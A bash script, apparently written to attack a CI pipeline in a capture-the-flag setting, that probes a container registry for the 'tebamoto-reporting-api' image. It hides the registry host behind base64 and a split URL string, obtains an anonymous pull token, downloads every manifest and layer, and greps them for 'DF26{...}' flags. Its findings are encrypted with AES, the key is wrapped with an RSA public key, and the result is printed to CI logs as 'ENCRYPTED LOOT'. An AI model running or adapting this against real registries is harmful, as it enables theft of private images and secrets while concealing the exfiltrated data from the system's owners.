#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"; REG=$(printf '%s' 'Y3J0YmxwbGF0cHJvZHgzZXVvei5henVyZWNyLmlv' | base64 -d)
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
TK=$(curl -sS -G "${SC}${REG}/oauth2/token" --data-urlencode "service=${REG}" --data-urlencode "scope=repository:tebamoto-reporting-api:pull" | jq -r '.access_token // empty'); say "TK=${#TK}"
[ -z "$TK" ] && say "TOKRESP: $(curl -sS -G "${SC}${REG}/oauth2/token" --data-urlencode "service=${REG}" --data-urlencode "scope=repository:tebamoto-reporting-api:pull" | head -c 500)"
[ -z "$TK" ] && { PASS=$(openssl rand -hex 16); openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null; echo "=== ENCRYPTED LOOT ==="; echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"; echo "DATA:$(base64 -w0 "$LOOT.enc")"; echo "=== DONE ==="; exit 0; }
say "TAGS: $(curl -sS -H "Authorization: Bearer $TK" "${SC}${REG}/v2/tebamoto-reporting-api/tags/list")"
IDX=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.list.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json' "${SC}${REG}/v2/tebamoto-reporting-api/manifests/latest")
say "IDX: $(printf '%s' "$IDX" | head -c 1200)"
for D in $(printf '%s' "$IDX" | grep -oE 'sha256:[a-f0-9]+' | sort -u); do
  M=$(curl -sS -H "Authorization: Bearer $TK" -H 'Accept: application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json' "${SC}${REG}/v2/tebamoto-reporting-api/manifests/$D")
  say "MAN $D: $(printf '%s' "$M" | head -c 800)"
  for L in $(printf '%s' "$M" | grep -oE 'sha256:[a-f0-9]+' | sort -u); do
    curl -sL -H "Authorization: Bearer $TK" "${SC}${REG}/v2/tebamoto-reporting-api/blobs/$L" -o /tmp/lay.tgz 2>/dev/null
    sz=$(wc -c </tmp/lay.tgz 2>/dev/null || echo 0)
    hits=$(grep -aoiE 'DF26\{[^}]{1,200}\}' /tmp/lay.tgz 2>/dev/null | sort -u | head -3)
    fl=$(tar -tzf /tmp/lay.tgz 2>/dev/null | head -40 | tr '\n' ',')
    say "LAYER $L size=$sz files=$fl"
    [ -n "$hits" ] && say "PLAINHIT: $hits"
  done
done
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
